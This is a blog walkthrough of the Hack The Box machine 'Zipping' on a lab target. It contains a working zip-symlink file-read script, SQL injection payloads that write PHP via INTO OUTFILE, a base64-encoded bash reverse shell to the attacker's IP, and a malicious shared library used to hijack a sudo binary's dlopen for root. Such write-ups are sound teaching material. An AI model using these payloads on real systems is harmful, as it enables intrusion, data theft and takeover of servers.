---
layout: post
title: Hack The Box Walkthrough - Zipping
date: 2023-10-22
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/10/HTB/Zipping
img: 2023/10/Zipping/Zipping.png
---

In Zipping, I had to exploit three different vulnerabilites to get a shell. A Local File Inclusion, a File Upload, and SQL Injection combined together. Then I exploited a binary that I could run with `sudo` to become root.

* Room: Zipping
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Zipping](https://app.hackthebox.com/machines/Zipping)
* Author: [xdann1](https://app.hackthebox.com/users/535069)

## Enumeration

As I always, I started the box by running RustScan to check for any open ports on the target server.

```bash
$ rustscan -a target -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.104.14:22
Open 10.129.104.14:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-02 19:09 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed

Nmap scan report for target (10.129.104.14)
Host is up, received user-set (0.034s latency).
Scanned at 2023-10-02 19:09:37 EDT for 11s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP6mSkoF2+wARZhzEmi4RDFkpQx3gdzfggbgeI5qtcIseo7h1mcxH8UCPmw8Gx9+JsOjcNPBpHtp2deNZBzgKcA=
|   256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOXXd7dM7wgVC+lrF0+ZIxKZlKdFhG2Caa9Uft/kLXDa
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.54 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

...

Nmap done: 1 IP address (1 host up) scanned in 11.78 seconds
```

There were two open ports:

* 22 (SSH)
* 80 (HTTP)

I did not see any domain to scan for subdomains, and a UDP scan did not show anything.

## Website

I looked at the website on port 80.

![Watch Store](/assets/images/2023/10/Zipping/WatchStore.png "Watch Store")

It was a site for selling watches. I ran Feroxbuster on it, but it did not find anything did not see by navigating through the site.

### Local File Inclusion

The store page URL for products looked interesting.

![Product](/assets/images/2023/10/Zipping/Product.png "Product")


The page parameter allowed including files from the server. I played with it a little bit. Whenever the file inclusion failed, I would get the list of products. It was adding the '.php' extension after the file name. And the PHP files were executed. I could not add PHP filters, so I was not able to use it to read the code.

![LFI](/assets/images/2023/10/Zipping/LFI.png "LFI")

I was able to include PHP files, but I could not find any way to exploit it yet. So I kept looking at other pages on the site.

### File Upload

The 'Work With Us' page allowed uploading files to the server.

![Work With Us](/assets/images/2023/10/Zipping/WorkWithUs.png "Work With Us")

The application only allowed uploading zip files. And the file had to contain one PDF.

![Zip File Must Contain One PDF](/assets/images/2023/10/Zipping/ZipFileMustContainOnePdf.png "Zip File Must Contain One PDF")

I looked on HackTricks and found that I could use the fact that the server was decompressing the zip file to get it to [read arbitrary files](https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload). I had to create a ZIP file that contained a symlink to the file I wanted to read. The server would uncompress the zip file, if the symlink had the '.pdf' extension, I would get a link to it back. Reading the PDF would give me the content of the file I was trying to read.

I tried it manually and it worked. But it was tedious to use if I wanted to read multiple files. So I created a small Python script to do the work for me.

```python
#!/usr/bin/env python3

import requests
import sys
import os
import re

file_to_get = sys.argv[1]

# Create the symlink to the file to read
command = f'ln -s {file_to_get} link.pdf'
os.system(command)

# Create the zip file
os.system('zip --symlinks zip.zip link.pdf')

# Upload the zip file
proxy_servers = {
    'http': 'http://127.0.0.1:8080',
}
files = {'zipFile': open('zip.zip', 'rb')}
response = requests.post('http://target.htb/upload.php', files=files, data={'submit': True}, proxies=proxy_servers)

# Create the path to the PDF using the path in the response
response_text = response.text
path = re.search('"uploads/(.*)/link\.pdf"', response_text)[1]
url = f'http://target.htb/uploads/{path}/link.pdf'

# Read the file
response = requests.get(url)
print(response.text)

# Cleanup
os.system('rm link.pdf zip.zip')
```

I could use the script to read files on the server.

```bash
$ ./getFile.py /etc/passwd
  adding: link.pdf (stored 0%)
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
rektsu:x:1001:1001::/home/rektsu:/bin/bash
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:999::/var/log/laurel:/bin/false
```

I used it to read the user flag.

```bash
$ ./getFile.py /home/rektsu/user.txt
  adding: link.pdf (stored 0%)
REDACTED
```

### SQL Injection

I used the script to extract the source code of the site.

The product page had a big hint of the next step.

```php
<?php
// Check to make sure the id parameter is specified in the URL
if (isset($_GET['id'])) {
    $id = $_GET['id'];
    // Filtering user input for letters or special characters
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $id, $match)) {
        header('Location: index.php');
    } else {
        // Prepare statement and execute, but does not prevent SQL injection
        $stmt = $pdo->prepare("SELECT * FROM products WHERE id = '$id'");
        $stmt->execute();
        // Fetch the product from the database and return the result as an Array
        $product = $stmt->fetch(PDO::FETCH_ASSOC);
        // Check if the product exists (array is not empty)
        if (!$product) {
            // Simple error to display if the id for the product doesn't exists (array is empty)
            exit('Product does not exist!');
        }
    }
} else {
    // Simple error to display if the id wasn't specified
    exit('No ID provided!');
}
?>

<?=template_header('Zipping | Product')?>

<div class="product content-wrapper">
    <img src="assets/imgs/<?=$product['img']?>" width="500" height="500" alt="<?=$product['name']?>">

...
```

The query used to get the product was vulnerable to SQL Injection. The comment above it made it clear. The query used a prepared statement, but it inserted the product ID directly into the query instead of using parameters. So the query was vulnerable.

The code was using a regular expression to validate the ID. The regex was using a reject list to make sure the ID only contains numbers. But I could send a [multiline](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-.) ID to bypass the validation.

I started with a simple query to validate it.

```http
GET /shop/index.php?page=product&id=%0a20'%20OR%201=1--%20-1 HTTP/1.1
Host: target.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: PHPSESSID=kfcu02o7lt7hifcejonm6v3m0b
Upgrade-Insecure-Requests: 1
```

It returned the first product. I tried with a query that would not return anything.

```http
GET /shop/index.php?page=product&id=%0a20'%20OR%201!=1--%20-1 HTTP/1.1
```

```http
HTTP/1.1 200 OK
Date: Sun, 22 Oct 2023 13:22:01 GMT
Server: Apache/2.4.54 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 23
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Product does not exist!
```

### Code Execution

With that information, I could use two vulnerabilities together to get code execution on the server. The SQL injection allowed me to use [Select Into Outfile](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) to write a file to the server. Then the LFI in the shop would allow me to execute the file, as long as it had the 'php' extension.

I used `Order By` to find how many columns were returned by the query.

```
GET /shop/index.php?page=product&id=%0a2'%20order%20by%208--%20-1 HTTP/1.1
```

I used this to test if I could write a file on the server.

```
GET /shop/index.php?page=product&id=%0a20'%20Union%20Select%201,'%3C%3Fphp%20echo%20%22in%22%3B%3F%3E',3,4,5,6,7,8%20Into%20OUTFILE%20'/dev/shm/rce.php'%20--%20-1 HTTP/1.1
```

Then included the created file using the shop.


```http
GET /shop/index.php?page=/dev/shm/rce HTTP/1.1
Host: target.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: PHPSESSID=kfcu02o7lt7hifcejonm6v3m0b
Upgrade-Insecure-Requests: 1
```

It printed 'in' in the response. Which meant the code was executed.

```http
HTTP/1.1 200 OK
Date: Sat, 07 Oct 2023 17:46:55 GMT
Server: Apache/2.4.54 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 23
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

1 in 3 4.00 5.00 6 7 8
```

I used this to create a reverse shell. I started by using base64 to encode the reverse shell command.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.55/4444 0>&1  ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTUvNDQ0NCAwPiYxICAK
```

I created PHP code to execute the reverse shell.

```php
<?php `echo -n YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTUvNDQ0NCAwPiYxICAK | base64 -d | bash`; ?>
```

I URL encoded it, and sent it to the server.

```http
GET /shop/index.php?page=product&id=%0a20'%20Union%20Select%201,'%3C%3Fphp%20%60echo%20%2Dn%20YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTUvNDQ0NCAwPiYxICAK%20%7C%20base64%20%2Dd%20%7C%20bash%60%3B%20%3F%3E',3,4,5,6,7,8%20Into%20OUTFILE%20'/dev/shm/shell.php'%20--%20-1 HTTP/1.1
```

I started a netcat listener and accessed the shell file.

```http
GET /shop/index.php?page=/dev/shm/shell HTTP/1.1
```

I was in.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.44] from (UNKNOWN) [10.129.92.94] 39650
bash: cannot set terminal process group (1112): Inappropriate ioctl for device
bash: no job control in this shell
rektsu@zipping:/var/www/html/shop$
```


## Getting root

Once connected to the server, I copied my SSH public key and reconnect with SSH.

```bash
rektsu@zipping:/home/rektsu/.ssh$ echo ssh-rsa AAAAB3... > authorized_keys
<2m8Es= > authorized_keys

rektsu@zipping:/home/rektsu/.ssh$ chmod 600 authorized_keys
chmod 600 authorized_keys
```

I checked if I could run anything with `sudo`.

```bash
rektsu@zipping:~$ sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock

rektsu@zipping:~$ file /usr/bin/stock
/usr/bin/stock: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aa34d8030176fe286f8011c9d4470714d188ab42, for GNU/Linux 3.2.0, not stripped

rektsu@zipping:~$ sudo /usr/bin/stock
Enter the password: fdssjk
Invalid password, please try again.
```

I was able to run a binary. I tried it, it needed a password. I downloaded the file to my machine and opened it with Ghidra. I renamed a few variables to make it more readable. The `checkAuth` function had the password in clear.

![Check Auth Function](/assets/images/2023/10/Zipping/checkAuth.png "Check Auth Function")

```bash
rektsu@zipping:~$ sudo /usr/bin/stock
Enter the password: St0ckM4nager

================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option: 1

================== Stock Actual ==================

Colour     Black   Gold    Silver
Amount     4       15      5

Quality   Excelent Average Poor
Amount    4         15      5

Exclusive Yes    No
Amount    4      19

Warranty  Yes    No
Amount    4      19


================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option: 2

================== Edit Stock ==================

Enter the information of the watch you wish to update:
Colour (0: black, 1: gold, 2: silver): 1
Quality (0: excelent, 1: average, 2: poor): 1
Exclusivity (0: yes, 1: no): 1
Warranty (0: yes, 1: no): 1
Amount: 1
The stock has been updated correctly.

================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option: 1

================== Stock Actual ==================

Colour     Black   Gold    Silver
Amount     4       16      5

Quality   Excelent Average Poor
Amount    4         16      5

Exclusive Yes    No
Amount    4      20

Warranty  Yes    No
Amount    4      20


================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option: 3
rektsu@zipping:~$
```

The application displayed an inventory and allowed changing it. I looked at the application code in Ghidra. Most of it was in `main`.

![Main Function](/assets/images/2023/10/Zipping/main.png "Main Function")

The call to [dlopen](https://linux.die.net/man/3/dlopen) was interesting. It dynamically loaded a library from the server. The path to the library was obfuscated with XOR. I ran the application with GDB to be able to read the path after it was XORed back to the original value.


```bash
$ gdb ./stock
GNU gdb (Debian 13.2-1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./stock...
(No debugging symbols found in ./stock)

(gdb) disas main

...

 0x00000000000013b6 <+252>:   lea    rax,[rbp-0xe0]
   0x00000000000013bd <+259>:   mov    ecx,0x8
   0x00000000000013c2 <+264>:   mov    esi,0x22
   0x00000000000013c7 <+269>:   mov    rdi,rax
   0x00000000000013ca <+272>:   call   0x11f9 <XOR>
   0x00000000000013cf <+277>:   lea    rax,[rbp-0xe0]
   0x00000000000013d6 <+284>:   mov    esi,0x1
   0x00000000000013db <+289>:   mov    rdi,rax
   0x00000000000013de <+292>:   call   0x10b0 <dlopen@plt>
   0x00000000000013e3 <+297>:   mov    QWORD PTR [rbp-0x20],rax
   0x00000000000013e7 <+301>:   mov    DWORD PTR [rbp-0x24],0x0
   0x00000000000013ee <+308>:   mov    DWORD PTR [rbp-0x28],0x0

...

(gdb) b *main +292
Breakpoint 1 at 0x13de

(gdb) r
Starting program: /home/ehogue/Kali/OnlineCTFs/HackTheBox/Zipping/stock
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter the password: St0ckM4nager

Breakpoint 1, 0x00005555555553de in main ()
=> 0x00005555555553de <main+292>:       e8 cd fc ff ff          call   0x5555555550b0 <dlopen@plt>
(gdb) p $rax
$1 = 140737488345536

(gdb) x/s $rax
0x7fffffffd9c0: "/home/rektsu/.config/libcounter.so"
```

The library was loaded from the user's home folder. I could create my own library that would execute malicious code and have it run as root.

I found a [simple example](https://www.shellguardians.com/2010/11/escalation-with-library-upload-gnu-ld.html) that ran `sh`. I compiled it on my machine and sent it to the server.

```bash
$ cat evil.c
#include <errno.h>
#include <unistd.h>

static void __attribute__ ((constructor)) install (void)
{
      execl("/bin/sh", "/bin/sh", (char *) 0);
}

$ gcc -c -fPIC evil.c -o evil.o

$ gcc -shared -Wl,-soname,libevil.so.1 -o libevil.so evil.o

$ scp libevil.so rektsu@target:~/
libevil.so                                                                                                                                                                                               100%   15KB 102.9KB/s   00:00
```

On the server, I made it executable and copied it where the application would read it.

```bash
rektsu@zipping:~$ ls -ltrh
total 20K
-rw-r----- 1 root   rektsu  33 Oct 22 11:22 user.txt
-rwxrwx--- 1 rektsu rektsu 16K Oct 22 11:43 libevil.so
rektsu@zipping:~$ chmod 777 libevil.so

rektsu@zipping:~$ cp libevil.so /home/rektsu/.config/libcounter.so
```

I ran the program and read the root flag.

```bash
rektsu@zipping:~$ sudo /usr/bin/stock
Enter the password: St0ckM4nager

# whoami
root

# cat /root/root.txt
REDACTED
```
